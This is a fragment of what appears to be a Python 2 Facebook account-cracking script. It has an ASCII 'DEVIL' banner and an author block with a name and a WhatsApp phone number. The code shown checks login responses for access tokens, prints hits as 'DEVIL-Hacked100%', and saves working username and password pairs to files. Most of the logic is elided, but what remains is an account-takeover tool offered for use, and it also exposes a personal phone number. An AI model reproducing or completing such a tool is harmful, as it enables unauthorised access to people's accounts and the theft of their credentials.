...
\033[1;95m8888888b.  8888888888 888     888 8888888 888      
\033[1;95m888  "Y88b 888        888     888   888   888      
\033[1;95m888    888 888        888     888   888   888      
\033[1;95m888    888 8888888    Y88b   d88P   888   888      
\033[1;95m888    888 888         Y88b d88P    888   888      
\033[1;95m888    888 888          Y88o88P     888   888      
\033[1;95m888  .d88P 888           Y888P      888   888      
\033[1;95m8888888P"  8888888888     Y8P     8888888 88888888 
...
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 DEVIL (SAJJAD) 💗
\x1b[1;91m➣ PAGE NAME :  💣 DEVIL SAJJAD 💣
\x1b[1;93m➣ WHATSAPP NO :   👬 +8801840215106 👬
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://www.facebook.com/abalxhodi.py')
		login()
	elif ahmad =='0':
		exb()
	else:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					...
					cpb.append(c+user+pass1)
 				    ...
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m{DEVIL-Hacked100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
 				        okb = open('save/successfull.txt', 'a')
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;96m[DEVIL-Checkpoint] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
